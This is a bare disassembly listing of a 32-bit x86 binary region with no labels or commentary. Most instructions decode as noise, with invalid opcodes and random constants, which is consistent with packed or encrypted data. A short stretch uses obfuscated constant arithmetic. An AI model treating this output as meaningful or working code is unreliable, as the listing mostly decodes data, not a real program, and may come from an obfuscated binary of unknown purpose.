  40d2d5:	xchg   ebp,eax
  40d2d6:	jle    0x40d356
  40d2d8:	jge    0x40d357
  40d2da:	jle    0x40d35a
  40d2dc:	test   BYTE PTR [ebx+eiz*4-0x65ddab5b],al
  40d2e3:	sbb    edi,edx
  40d2e5:	dec    esi
  40d2e6:	pusha  
  40d2e7:	mov    esp,0x3da55c61
  40d2ec:	int3   
  40d2ed:	push   ss
  40d2ee:	cld    
  40d2ef:	pushf  
  40d2f0:	(bad)  
  40d2f1:	inc    esp
  40d2f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2f3:	pop    ebp
  40d2f4:	push   0xffffffe9
  40d2f6:	push   0x6a351fda
  40d2fb:	mov    al,ds:0xfab49376
  40d300:	mov    BYTE PTR [edx],bl
  40d302:	mov    ebx,0xca64d374
  40d307:	sub    DWORD PTR [ebp*4+0x35335262],eax
  40d30e:	loope  0x40d31f
  40d310:	or     bl,BYTE PTR [ecx-0x6a]
  40d313:	xchg   ebx,eax
  40d314:	jmp    0xba96b2e1
  40d319:	(bad)  
  40d31a:	(bad)  
  40d31b:	aad    0x78
  40d31d:	inc    ebx
  40d31e:	stos   DWORD PTR es:[edi],eax
  40d31f:	in     eax,0xb6
  40d321:	jge    0x40d395
  40d323:	jmp    0x40d362
  40d325:	jp     0x40d3a3
  40d327:	inc    edx
  40d328:	cmp    al,BYTE PTR [eax-0x41476898]
  40d32e:	fistp  QWORD PTR [edi+0x3b]
  40d331:	sti    
  40d332:	int3   
  40d333:	inc    ebp
  40d334:	arpl   WORD PTR [eax+0x43],cx
  40d337:	xlat   BYTE PTR ds:[ebx]
  40d338:	pop    edx
  40d339:	out    dx,eax
  40d33a:	inc    eax
  40d33b:	sub    edi,DWORD PTR [ecx+0x15b5afc0]
  40d341:	les    edx,FWORD PTR [eax-0x28ec748b]
  40d347:	enter  0xb7c3,0xd7
  40d34b:	xor    esi,DWORD PTR [ebx]
  40d34d:	cmp    ch,BYTE PTR ds:0x1bbf7bd6
  40d353:	and    DWORD PTR [edi-0x4fb2ed67],0x88056ce8
  40d35d:	dec    edx
  40d35e:	or     eax,0x8f170fc6
  40d363:	lea    ecx,[ebp+0x699f42a8]
  40d369:	ret    
  40d36a:	test   edx,0xb052fd3a
  40d370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d371:	les    edx,FWORD PTR [ebp-0x4f]
  40d374:	xchg   esi,eax
  40d375:	outs   dx,BYTE PTR ds:[esi]
  40d376:	push   ecx
  40d377:	pop    edx
  40d378:	add    ebp,edx
  40d37a:	dec    edx
  40d37b:	fdiv   DWORD PTR [esi]
  40d37d:	push   edx
  40d37e:	fsincos 
  40d380:	fnstenv [esi+0x29]
  40d383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d384:	mov    ?,ebx
  40d386:	sub    al,0x78
  40d388:	mov    ch,0xd3
  40d38a:	ins    BYTE PTR es:[edi],dx
  40d38b:	xchg   DWORD PTR [ebx+ecx*1],ebp
  40d38e:	dec    DWORD PTR [ebp+0x1f2519c0]
  40d394:	ss (bad) 
  40d396:	mov    ebx,0x24493bde
  40d39b:	pusha  
  40d39c:	test   ah,dl
  40d39e:	dec    ecx
  40d39f:	aam    0x18
  40d3a1:	add    DWORD PTR [ecx],eax
  40d3a3:	jae    0x40d3fd
  40d3a5:	pop    ecx
  40d3a6:	daa    
  40d3a7:	sbb    DWORD PTR [ecx+0x76],ecx
  40d3aa:	leave  
  40d3ab:	shl    ecx,0xc3
  40d3ae:	cmp    edi,ebx
  40d3b0:	and    edi,DWORD PTR [ebx+0x1f5fa5af]
  40d3b6:	std    
  40d3b7:	add    bl,BYTE PTR es:[ecx+0x374dade]
  40d3be:	push   es
  40d3bf:	jne    0x40d344
  40d3c1:	iret   
  40d3c2:	sar    DWORD PTR [eax+0xf],0xc6
  40d3c6:	mov    bl,bh
  40d3c8:	(bad)  
  40d3c9:	and    al,0x23
  40d3cb:	jmp    0x67e03cd
  40d3d0:	xchg   ebp,eax
  40d3d1:	das    
  40d3d2:	retf   0x9fde
  40d3d5:	sub    BYTE PTR [edx-0x7],dh
  40d3d8:	das    
  40d3d9:	inc    ecx
  40d3da:	mov    ds:0xfb4de963,al
  40d3df:	xchg   ecx,eax
  40d3e0:	cdq    
  40d3e1:	je     0x40d367
  40d3e3:	xchg   ebp,eax
  40d3e4:	inc    esi
  40d3e5:	or     eax,0x2bdb9018
  40d3ea:	xchg   ebp,eax
  40d3eb:	mov    edi,DWORD PTR [esi]
  40d3ed:	pop    ecx
  40d3ee:	sub    al,0x65
  40d3f0:	mov    ebp,0xe60dfffc
  40d3f5:	xchg   esp,eax
  40d3f6:	sbb    ecx,ebp
  40d3f8:	xchg   ecx,eax
  40d3f9:	jl     0x40d45e
  40d3fb:	dec    esp
  40d3fc:	pushf  
  40d3fd:	fstp   QWORD PTR [ecx+0x687c3ed8]
  40d403:	not    BYTE PTR [edi+0x444e35b7]
  40d409:	mov    al,0x74
  40d40b:	sbb    DWORD PTR [edi],esi
  40d40d:	rol    DWORD PTR [ebx-0x57d106b7],1
  40d413:	xchg   ebp,eax
  40d414:	loopne 0x40d3f4
  40d416:	sbb    edi,edi
  40d418:	ss mov dl,0xb3
  40d41b:	inc    eax
  40d41c:	test   eax,0xc2f4c3a4
  40d421:	or     DWORD PTR [eax],esp
  40d423:	in     al,dx
  40d424:	ins    BYTE PTR es:[edi],dx
  40d425:	add    eax,0xcc9b237
  40d42a:	mov    ds:0xac8db02d,eax
  40d42f:	cmp    BYTE PTR ds:0xfe8f94d1,bl
  40d435:	cmp    al,0x2e
  40d437:	adc    ebp,ebx
  40d439:	sbb    DWORD PTR [ebx],edi
  40d43b:	mov    ah,0x1a
  40d43d:	add    ah,BYTE PTR [esi+0x637b06d6]
  40d443:	jbe    0x40d3d2
  40d445:	retf   
  40d446:	sbb    BYTE PTR [edx+0x51],bh
  40d449:	lods   eax,DWORD PTR ds:[esi]
  40d44a:	xor    al,BYTE PTR [esi+ebp*4]
  40d44d:	and    eax,DWORD PTR [ebx-0x47]
  40d450:	sahf   
  40d451:	popf   
  40d452:	ins    DWORD PTR es:[edi],dx
  40d453:	sub    DWORD PTR [edx],ecx
  40d455:	xchg   esi,eax
  40d456:	adc    eax,0xdcc61803
  40d45b:	ss std 
  40d45d:	icebp  
  40d45e:	pop    eax
  40d45f:	popf   
  40d460:	dec    DWORD PTR [eax]
  40d462:	cmp    al,0x55
  40d464:	into   
  40d465:	jns    0x40d4ab
  40d467:	jl     0x40d404
  40d469:	out    dx,eax
  40d46a:	jno    0x40d46e
  40d46c:	add    ebx,DWORD PTR [esi+0x73]
  40d46f:	mov    BYTE PTR [eax-0x27],ah
  40d472:	pop    ebp
  40d473:	inc    eax
  40d474:	les    ecx,FWORD PTR [ebp+0x8]
  40d477:	dec    ecx
  40d478:	pop    ebp
  40d479:	int3   
  40d47a:	lods   al,BYTE PTR ds:[esi]
  40d47b:	mov    ds:0x18d8274,eax
  40d480:	pop    esp
  40d481:	mov    dl,0xd4
  40d483:	out    dx,al
  40d484:	fstp   st(2)
  40d486:	int3   
  40d487:	into   
  40d488:	bound  ebp,QWORD PTR [edx+0x79]
  40d48b:	sbb    ah,ah
  40d48d:	dec    edx
  40d48e:	pop    eax
  40d48f:	xor    bh,cl
  40d491:	sub    eax,0x33e11c92
  40d496:	xlat   BYTE PTR ds:[ebx]
  40d497:	mov    cl,0x3a
  40d499:	faddp  st(3),st
  40d49b:	push   ds
  40d49c:	sahf   
  40d49d:	lock adc eax,0x4c109896
  40d4a3:	in     eax,0x6c
  40d4a5:	sar    DWORD PTR [ecx-0x67b72b7a],0x5a
  40d4ac:	addr16 jmp 0x9b7b:0x5bfd1446
  40d4b4:	js     0x40d500
  40d4b6:	in     eax,0xb
  40d4b8:	repnz (bad) 
  40d4ba:	es gs and eax,0xe8e936cc
  40d4c1:	xchg   ebx,eax
  40d4c2:	inc    ecx
  40d4c3:	stc    
  40d4c4:	or     al,BYTE PTR [esi+0x6c666ee5]
  40d4ca:	mov    ch,0xd0
  40d4cc:	sbb    BYTE PTR [esi],ch
  40d4ce:	xchg   ebx,eax
  40d4cf:	add    edx,DWORD PTR [edx]
  40d4d1:	ins    BYTE PTR es:[edi],dx
  40d4d2:	or     BYTE PTR ds:0xf21a58c,ah
  40d4d8:	xchg   ecx,eax
  40d4d9:	jne    0x40d4e6
  40d4db:	pop    esi
  40d4dc:	ins    DWORD PTR es:[edi],dx
  40d4dd:	cwde   
  40d4de:	dec    edi
  40d4df:	jmp    0x40d536
  40d4e1:	aam    0xa1
  40d4e3:	icebp  
  40d4e4:	mov    edx,0x95bbf000
  40d4e9:	pop    edx
  40d4ea:	adc    ebp,DWORD PTR [ebx]
  40d4ec:	and    DWORD PTR [ebp-0x63],edx
  40d4ef:	imul   ecx,DWORD PTR [ebx+0x58514a3b],0xffffffbe
  40d4f6:	rol    BYTE PTR [ebx+0x53],1
  40d4f9:	dec    esi
  40d4fa:	jmp    0x901eef96
  40d4ff:	and    DWORD PTR [eax*4-0x740a7b25],edi
  40d506:	xchg   esp,eax
  40d507:	cli    
  40d508:	cmp    dh,dh
  40d50a:	repnz and eax,0xd09decac
  40d510:	pop    ecx
  40d511:	jl     0x40d4eb
  40d513:	rcr    BYTE PTR ds:0xe9971246,0xe5
  40d51a:	xchg   BYTE PTR [ebp-0x58],bl
  40d51d:	and    dl,cl
  40d51f:	xchg   ebx,eax
  40d520:	fdiv   QWORD PTR [esi+0x4e]
  40d523:	sub    BYTE PTR [edx-0x767824b3],bh
  40d529:	mov    eax,0x416099a3
  40d52e:	sbb    eax,0x4213fb82
  40d533:	fucomi st,st(7)
  40d535:	mov    esi,0x4083226d
  40d53a:	and    eax,0x99cd82c2
  40d53f:	mov    al,BYTE PTR [esi+0x69]
  40d542:	sti    
  40d543:	inc    ebx
  40d544:	fsub   st(4),st
  40d546:	popf   
  40d547:	xchg   BYTE PTR [ecx],dl
  40d549:	add    dh,dl
  40d54b:	mov    al,0xa8
  40d54d:	mov    ch,0xc2
  40d54f:	adc    DWORD PTR [esi],edx
  40d551:	dec    ebx
  40d552:	inc    eax
  40d553:	pop    ds
  40d554:	dec    edx
  40d555:	cmp    ebp,DWORD PTR [ebx+0x73]
  40d558:	xchg   ecx,eax
  40d559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d55a:	mov    al,ds:0xaddbb5ea
  40d55f:	push   ecx
  40d560:	fsub   DWORD PTR [edx+0x1e]
  40d563:	xchg   edx,eax
  40d564:	sahf   
  40d565:	stos   BYTE PTR es:[edi],al
  40d566:	dec    edi
  40d567:	mov    ch,0x21
  40d569:	pop    esi
  40d56a:	mov    edx,0x93b1c37e
  40d56f:	sub    BYTE PTR [ebp-0x75],dl
  40d572:	test   DWORD PTR [ebx],eax
  40d574:	lea    ecx,[edx-0x2d]
  40d577:	pop    ecx
  40d578:	fmul   DWORD PTR [ebp+0x2cb27b86]
  40d57e:	add    ecx,edi
  40d580:	jbe    0x40d5da
  40d582:	sub    bl,BYTE PTR [ecx-0x7121b2b3]
  40d588:	or     ah,BYTE PTR [ebx-0x4d]
  40d58b:	aad    0xb2
  40d58d:	das    
  40d58e:	test   si,si
  40d591:	pusha  
  40d592:	inc    edi
  40d593:	sbb    eax,DWORD PTR [ebp+0x5a2d143d]
  40d599:	sti    
  40d59a:	cmp    eax,0xeb64aa73
  40d59f:	dec    esi
  40d5a0:	or     BYTE PTR [ebx-0xa6e57f2],bl
  40d5a6:	xor    eax,0xbd271c83
  40d5ab:	mov    ecx,0x54e6f30d
  40d5b0:	mov    ds:0xd9e60c46,al
  40d5b5:	fiadd  WORD PTR [ebx-0x46f8feb9]
  40d5bb:	sbb    eax,0xbf5a8da9
  40d5c0:	sub    ah,BYTE PTR [ebx+0x4a]
  40d5c3:	cmp    DWORD PTR [edx+0xf],esi
  40d5c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5c7:	pushf  
  40d5c8:	push   edi
  40d5c9:	xchg   ebx,eax
  40d5ca:	das    
  40d5cb:	imul   ebx,DWORD PTR [edx],0x42
  40d5ce:	dec    edi
  40d5cf:	xor    al,0xb2
  40d5d1:	test   DWORD PTR [edx],edi
  40d5d3:	pop    esp
  40d5d4:	(bad)
  40d5d7:	cmp    BYTE PTR [ebp-0x80],dh
  40d5da:	(bad)  
  40d5db:	fild   WORD PTR [edi]
  40d5dd:	add    DWORD PTR [ecx+0xf],esi
  40d5e0:	scas   eax,DWORD PTR es:[edi]
  40d5e1:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40d5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5ea:	lea    ecx,[edx+ecx*1+0x32729b]
  40d5f1:	cmp    ecx,eax
  40d5f3:	je     0x40dfca
  40d5f9:	mov    edi,DWORD PTR [ebp-0x18]
  40d5fc:	mov    eax,DWORD PTR [ebp+0x8]
  40d5ff:	mov    edx,DWORD PTR [ebp+0x14]
  40d602:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d606:	mov    ecx,0x7510854
  40d60b:	xor    edx,edx
  40d60d:	xor    edi,ecx
  40d60f:	mov    esi,0x32729b
  40d614:	add    edi,esi
  40d616:	div    edi
  40d618:	mov    edx,DWORD PTR [ebp-0x4]
  40d61b:	jmp    0x40d93b
  40d620:	inc    ecx
  40d621:	stos   BYTE PTR es:[edi],al
  40d622:	push   ss
  40d623:	jmp    0x40d61a
  40d625:	jae    0x40d688
  40d627:	mov    al,0xbf
  40d629:	jo     0x40d5c5
  40d62b:	jecxz  0x40d691
  40d62d:	(bad)  
  40d62e:	outs   dx,DWORD PTR ds:[esi]
  40d62f:	pop    esi
  40d630:	sub    edx,DWORD PTR [eax+0x7d7d7e7e]
  40d636:	jle    0x40d6b6
  40d638:	dec    ecx
  40d639:	inc    edi
  40d63a:	mov    ecx,edx
  40d63c:	push   esi
  40d63d:	outs   dx,DWORD PTR ds:[esi]
  40d63e:	adc    eax,0xfbb379d0
  40d643:	and    eax,0x9a0b3e8b
  40d648:	cli    
  40d649:	or     BYTE PTR [edx-0x8],al
  40d64c:	mov    DWORD PTR [esi-0x66c47f7f],esp
  40d652:	push   es
  40d653:	test   al,0x55
  40d655:	push   0xffffffa1
  40d657:	push   0xfd3ea79e
  40d65c:	(bad)  
  40d65d:	hlt    
  40d65e:	sub    eax,0x72e1a19d
  40d663:	cmp    eax,0xee3c700c
  40d668:	jmp    0x40d6d1
  40d66a:	xor    al,0x41
  40d66c:	rcr    BYTE PTR [ecx-0x37],cl
  40d66f:	xlat   BYTE PTR ds:[ebx]
  40d670:	cmp    al,BYTE PTR [edi-0x143920a3]
  40d676:	inc    edi
  40d677:	mov    ch,0x95
  40d679:	jbe    0x40d611
  40d67b:	out    0x60,al
  40d67d:	inc    ebx
  40d67e:	push   cs
  40d67f:	test   DWORD PTR ds:0x73cbd877,edi
  40d685:	sbb    cl,BYTE PTR [ebx+0x5cfd200f]
  40d68b:	out    0x7d,eax
  40d68d:	icebp  
  40d68e:	call   0x9a897c50
  40d693:	ins    BYTE PTR es:[edi],dx
  40d694:	xchg   dl,al
  40d696:	lds    ebx,FWORD PTR fs:[edi]
  40d699:	in     al,0x57
  40d69b:	sbb    DWORD PTR [edx-0x470066f1],ebp
  40d6a1:	stos   BYTE PTR es:[edi],al
  40d6a2:	imul   esi,DWORD PTR [edi-0x2ac1a12a],0x43
  40d6a9:	xor    eax,0x6cbff6c3
  40d6ae:	leave  
  40d6af:	jge    0x40d71e
  40d6b1:	in     al,0x7c
  40d6b3:	jae    0x40d635
  40d6b5:	pop    eax
  40d6b6:	jl     0x40d71f
  40d6b8:	je     0x40d6e0
  40d6ba:	push   ebx
  40d6bb:	es jp  0x40d6f1
  40d6be:	mov    ds:0x3377ba52,eax
  40d6c3:	jmp    0x40d669
  40d6c5:	or     edi,DWORD PTR [ecx+0x4ce27296]
  40d6cb:	xor    DWORD PTR [edi+0x12821198],edi
  40d6d1:	pop    ss
  40d6d2:	repz out 0x6d,eax
  40d6d5:	shl    DWORD PTR [ecx+0x62],1
  40d6d8:	xchg   edi,eax
  40d6d9:	shl    ecx,cl
  40d6db:	es jno 0x40d6d4
  40d6de:	jae    0x40d689
  40d6e0:	cmp    BYTE PTR [esi],bl
  40d6e2:	outs   dx,DWORD PTR ds:[esi]
  40d6e3:	mov    ch,0x2c
  40d6e5:	pop    ecx
  40d6e6:	mov    ds:0xa6f02870,al
  40d6eb:	jno    0x40d69e
  40d6ed:	ins    DWORD PTR es:[edi],dx
  40d6ee:	xchg   ebp,eax
  40d6ef:	icebp  
  40d6f0:	inc    esp
  40d6f1:	aam    0x1d
  40d6f3:	or     eax,eax
  40d6f5:	in     al,dx
  40d6f6:	arpl   ax,cx
  40d6f8:	daa    
  40d6f9:	push   ds
  40d6fa:	sbb    eax,0x34beda2c
  40d6ff:	push   ds
  40d700:	cmp    dh,cl
  40d702:	(bad)  
  40d703:	inc    ebp
  40d704:	lds    edi,FWORD PTR [esi]
  40d706:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d708:	push   es
  40d709:	sti    
  40d70a:	sub    al,0x28
  40d70c:	inc    esp
  40d70d:	dec    edx
  40d70e:	cmp    al,0xe9
  40d710:	cmp    ebp,esp
  40d712:	inc    edi
  40d713:	or     ebx,esp
  40d715:	jmp    0x4c9e:0x823cce3b
  40d71c:	fs mov ah,0x33
  40d71f:	add    DWORD PTR [esi+eiz*4-0x49],eax
  40d723:	jnp    0x40d75e
  40d725:	mov    ds:0x7743665,eax
  40d72a:	and    BYTE PTR [edx+0x4bbd975b],cl
  40d730:	jg     0x40d6c4
  40d732:	dec    ebx
  40d733:	xor    al,0xb3
  40d735:	or     cl,dh
  40d737:	xchg   BYTE PTR [ebx-0x11],ch
  40d73a:	iret   
  40d73b:	leave  
  40d73c:	adc    BYTE PTR [eax-0x37],ch
  40d73f:	(bad)
  40d743:	and    eax,0x46a95490
  40d748:	inc    esi
  40d749:	and    dl,ch
  40d74b:	les    edi,FWORD PTR [ebx]
  40d74d:	pop    ecx
  40d74e:	xchg   ebx,eax
  40d74f:	nop
  40d750:	sbb    cl,BYTE PTR [eax]
  40d752:	in     al,dx
  40d753:	push   ecx
  40d754:	cmc    
  40d755:	scas   eax,DWORD PTR es:[edi]
  40d756:	cmp    al,BYTE PTR [esi]
  40d758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d759:	hlt    
  40d75a:	add    al,0xc6
  40d75c:	xlat   BYTE PTR ds:[ebx]
  40d75d:	fisttp DWORD PTR [ecx]
  40d75f:	pop    ecx
  40d760:	adc    edi,DWORD PTR [edx+0x3bd920da]
  40d766:	xchg   esi,eax
  40d767:	rcr    DWORD PTR [edi],1
  40d769:	add    ebx,edx
  40d76b:	jl     0x40d733
  40d76d:	jmp    0x40d76e
  40d76f:	pop    ebp
  40d770:	push   edx
  40d771:	mov    ebp,0xb4fe6c13
  40d776:	add    ah,BYTE PTR [edx-0x52fbe603]
  40d77c:	mov    ds:0x4ec3b3b5,eax
  40d781:	int    0x37
  40d783:	arpl   WORD PTR ds:0xbcfd00e1,bx
  40d789:	loop   0x40d7b1
  40d78b:	(bad)  
  40d78c:	std    
  40d78d:	dec    ecx
  40d78e:	cli    
  40d78f:	aad    0xb5
  40d791:	fidiv  WORD PTR [edx+0x5da2c546]
  40d797:	cmp    bh,BYTE PTR [edi+0x46]
  40d79a:	and    bl,BYTE PTR [edi+edx*1]
  40d79d:	jb     0x40d73d
  40d79f:	push   0x7974a34c
  40d7a4:	cld    
  40d7a5:	enter  0x86de,0x2d
  40d7a9:	mov    esp,0x3d38d41c
  40d7ae:	xor    ebp,edi
  40d7b0:	lods   eax,DWORD PTR ds:[esi]
  40d7b1:	sub    eax,0x1fc4ec0b
  40d7b6:	retf   
  40d7b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7b8:	sub    esp,edx
  40d7ba:	add    DWORD PTR [ebx+0x78],eax
  40d7bd:	xor    edi,DWORD PTR [edi+edi*4+0x7f4d9b4c]
  40d7c4:	imul   ecx,DWORD PTR [esi],0x1d8eee8e
  40d7ca:	imul   ebx,DWORD PTR [ecx+0x3823f2df],0xffffffaf
  40d7d1:	shl    dh,1
  40d7d3:	jmp    0xb3a2:0x74cd4c7d
  40d7da:	stos   DWORD PTR es:[edi],eax
  40d7db:	add    esi,0x6b
  40d7de:	mov    dl,0xf7
  40d7e0:	jp     0x40d77e
  40d7e2:	rcr    ebp,0x69
  40d7e5:	xor    dh,BYTE PTR [ebx-0x75a68a8b]
  40d7eb:	adc    BYTE PTR [eax+0x1a90dc67],al
  40d7f1:	pop    eax
  40d7f2:	loope  0x40d82f
  40d7f4:	ja     0x40d808
  40d7f6:	or     al,0xd0
  40d7f8:	call   FWORD PTR [ebp+0x2817bd1e]
  40d7fe:	aas    
  40d7ff:	pusha  
  40d800:	leave  
  40d801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d802:	in     al,0x45
  40d804:	dec    ebp
  40d805:	dec    esi
  40d806:	mov    DWORD PTR [eax+0x49d52e74],ebp
  40d80c:	mov    ch,0xa8
  40d80e:	popf   
  40d80f:	stc    
  40d810:	shr    BYTE PTR [edi],cl
  40d812:	idiv   DWORD PTR [ebx+0x48]
  40d815:	add    DWORD PTR [eax+0xc629ac7],edi
  40d81b:	push   0xed6fe104
  40d820:	gs pop ss
  40d822:	inc    ebx
  40d823:	and    al,0xc4
  40d825:	inc    ecx
  40d826:	mov    al,ds:0xc0e17ce3
  40d82b:	(bad)  
  40d82c:	sub    bl,cl
  40d82e:	addr16 inc ebp
  40d830:	stos   DWORD PTR es:[edi],eax
  40d831:	sbb    ecx,ebx
  40d833:	retf   0x476b
  40d836:	lea    ebp,[edx+0x72]
  40d839:	sub    eax,0x6c1d4a1b
  40d83e:	or     ebp,DWORD PTR [ebx-0x78]
  40d841:	fstp   TBYTE PTR [edx+0x17]
  40d844:	and    ebp,ebx
  40d846:	pop    ds
  40d847:	push   0xffffffdf
  40d849:	aas    
  40d84a:	mov    bl,0x16
  40d84c:	int    0xcc
  40d84e:	popf   
  40d84f:	xor    BYTE PTR [edx+eax*1-0x8],ch
  40d853:	jmp    FWORD PTR [esi]
  40d855:	out    0x1,al
  40d857:	sub    DWORD PTR [edi],eax
  40d859:	outs   dx,DWORD PTR ds:[esi]
  40d85a:	adc    al,BYTE PTR [edi+0x250115ed]
  40d860:	push   ds
  40d861:	mov    ebx,0x9140e759
  40d866:	iret   
  40d867:	ds add dh,dl
  40d86a:	dec    esp
  40d86b:	test   eax,0xf02d61b5
  40d870:	out    dx,al
  40d871:	setns  ah
  40d874:	loope  0x40d85c
  40d876:	(bad)  
  40d877:	xor    al,0xbb
  40d879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d87a:	sub    DWORD PTR [eax+edi*1-0x4810cffa],edx
  40d881:	mov    dh,0x80
  40d883:	mov    DWORD PTR [edx-0x7e],eax
  40d886:	dec    esp
  40d887:	or     dl,dh
  40d889:	sub    edi,DWORD PTR [edi+0x79671be5]
  40d88f:	mul    edx
  40d891:	and    DWORD PTR [edi],ecx
  40d893:	rol    DWORD PTR [edi-0x61],0x19
  40d897:	fadd   QWORD PTR [ecx]
  40d899:	ss push ds
  40d89b:	mov    al,0xb0
  40d89d:	popa   
  40d89e:	ret    
  40d89f:	add    bl,BYTE PTR [esi+0x7]
  40d8a2:	ret    
  40d8a3:	aad    0x2b
  40d8a5:	(bad)  
  40d8a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8a7:	jge    0x40d8bb
  40d8a9:	lods   al,BYTE PTR ds:[esi]
  40d8aa:	add    ah,BYTE PTR [ecx-0x72125138]
  40d8b0:	out    0x32,al
  40d8b2:	in     al,dx
  40d8b3:	mov    esi,0xbd618426
  40d8b8:	repnz or ebp,edi
  40d8bb:	push   esp
  40d8bc:	jno    0x40d860
  40d8be:	sar    BYTE PTR [edx],1
  40d8c0:	and    edi,edi
  40d8c2:	test   al,0x30
  40d8c4:	or     DWORD PTR [edi],ebp
  40d8c6:	xchg   ebp,eax
  40d8c7:	les    ebx,FWORD PTR [esi-0x7dc56506]
  40d8cd:	enter  0x84a5,0xec
  40d8d1:	xchg   esi,eax
  40d8d2:	int3   
  40d8d3:	cmp    ebx,DWORD PTR [ebp+0x8]
  40d8d6:	xchg   BYTE PTR [edx+eax*2],al
  40d8d9:	cwde   
  40d8da:	jge    0x40d8a7
  40d8dc:	jp     0x40d91e
  40d8de:	mov    cl,0xe9
  40d8e0:	shl    DWORD PTR [ebp+0x28],0x71
  40d8e4:	pop    ecx
  40d8e5:	push   ss
  40d8e6:	adc    bl,ch
  40d8e8:	cmp    DWORD PTR [edi],ebp
  40d8ea:	call   0x5cda:0xf821525a
  40d8f1:	cmp    al,0x9
  40d8f3:	jmp    0x6605:0xc3c8d751
  40d8fa:	xor    ecx,esp
  40d8fc:	(bad)  
  40d8fd:	loopne 0x40d8e4
  40d8ff:	push   edi
  40d900:	shr    BYTE PTR [eax+0x4d],cl
  40d903:	call   0x291c:0x6cf89d1a
  40d90a:	fidivr DWORD PTR [esi-0x4]
  40d90d:	push   ds
  40d90e:	add    al,0x94
  40d910:	aaa    
  40d911:	loop   0x40d8ad
  40d913:	leave  
  40d914:	push   edi
  40d915:	outs   dx,DWORD PTR ds:[esi]
  40d916:	stc    
  40d917:	scas   al,BYTE PTR es:[edi]
  40d918:	pop    ss
  40d919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d91a:	cmp    edi,DWORD PTR [edi]
  40d91c:	mov    ds:0x4e9af352,al
  40d921:	xchg   ebp,eax
  40d922:	mov    ah,0x66
  40d924:	(bad)  
  40d925:	mov    edi,0x7decf7a5
  40d92a:	and    edx,ebx
  40d92c:	ins    BYTE PTR es:[edi],dx
  40d92d:	outs   dx,DWORD PTR ds:[esi]
  40d92e:	xor    dl,BYTE PTR [edi]
  40d930:	push   edi
  40d931:	les    ebp,FWORD PTR [ecx-0x355a0a65]
  40d937:	dec    eax
  40d938:	jge    0x40d969
  40d93a:	mov    ds:0x848dd133,eax
  40d93f:	add    bl,BYTE PTR [ebx-0x16ffcd8e]
  40d945:	sbb    eax,DWORD PTR [ebx]
  40d947:	add    BYTE PTR [eax],al
  40d949:	das    
  40d94a:	sub    BYTE PTR [ecx],0x25
  40d94d:	mov    cl,0xb5
  40d94f:	xor    edx,DWORD PTR [eax-0x2c802913]
  40d955:	pop    esp
  40d956:	stc    
  40d957:	xor    DWORD PTR [esi],0x36
  40d95a:	lahf   
  40d95b:	jle    0x40d9db
  40d95d:	jge    0x40d9dc
  40d95f:	jle    0x40d9df
  40d961:	ins    DWORD PTR es:[edi],dx
  40d962:	daa    
  40d963:	outs   dx,BYTE PTR ds:[esi]
  40d964:	mov    ecx,0x9cd9c0db
  40d969:	lods   al,BYTE PTR ds:[esi]
  40d96a:	jo     0x40d984
  40d96c:	mov    ch,0x38
  40d96e:	adc    DWORD PTR [edx+0x17487716],esi
  40d974:	adc    BYTE PTR [edi+eax*1],bl
  40d977:	pop    esi
  40d978:	push   eax
  40d979:	test   DWORD PTR [edx+0x21],esp
  40d97c:	adc    bl,BYTE PTR [edi+ebp*1-0x1bd0f749]
  40d983:	stos   DWORD PTR es:[edi],eax
  40d984:	stc    
  40d985:	sahf   
  40d986:	test   eax,0x6ba74145
  40d98b:	mov    dl,0xb7
  40d98d:	les    ebp,FWORD PTR [esi]
  40d98f:	and    al,0x1f
  40d991:	cmp    cl,0x89
  40d994:	mov    esp,0x631a7fd0
  40d999:	xchg   esp,eax
  40d99a:	out    0x4e,eax
  40d99c:	fs push ebx
  40d99e:	cmp    eax,0xad228b66
  40d9a3:	fild   QWORD PTR [esi-0x62f13715]
  40d9a9:	fidivr WORD PTR gs:[eax]
  40d9ac:	jo     0x40d9b8
  40d9ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9af:	ror    DWORD PTR [ebx-0x77],cl
  40d9b2:	add    DWORD PTR [edx],ecx
  40d9b4:	push   ecx
  40d9b5:	sub    DWORD PTR [edx+0x69272dce],ecx
  40d9bb:	and    ch,BYTE PTR [edx+0x1f]
  40d9be:	dec    edi
  40d9bf:	aas    
  40d9c0:	inc    ebx
  40d9c1:	add    bl,BYTE PTR [edx]
  40d9c3:	cmp    dh,BYTE PTR [ecx-0x1b09368]
  40d9c9:	push   edi
  40d9ca:	inc    ebx
  40d9cb:	xchg   ebp,eax
  40d9cc:	push   ebx
  40d9cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9ce:	sbb    cl,bh
  40d9d0:	dec    esp
  40d9d1:	jge    0x40d9fc
  40d9d3:	and    al,0x5e
  40d9d5:	push   0x67
  40d9d7:	popa   
  40d9d8:	cld    
  40d9d9:	adc    BYTE PTR ds:0xe290af86,bl
  40d9df:	pop    esi
  40d9e0:	xchg   DWORD PTR [edi-0x75],esi
  40d9e3:	pmaxub mm6,QWORD PTR [edx+0x19]
  40d9e7:	fnstsw WORD PTR [esi+eiz*1-0x33ce6557]
  40d9ee:	lods   eax,DWORD PTR ds:[esi]
  40d9ef:	xchg   ebx,eax
  40d9f0:	mov    bh,0xf5
  40d9f2:	in     eax,dx
  40d9f3:	addr16 cmp esi,esi
  40d9f6:	xchg   esi,eax
  40d9f7:	mov    ebx,0xfd3547e
  40d9fc:	xor    bl,BYTE PTR [ecx+esi*2+0x18]
  40da00:	jmp    0x93fc:0x6640f5e0
  40da07:	mov    dl,dh
  40da09:	cli    
  40da0a:	call   0x334b2355
  40da0f:	aam    0x31
  40da11:	aad    0xe7
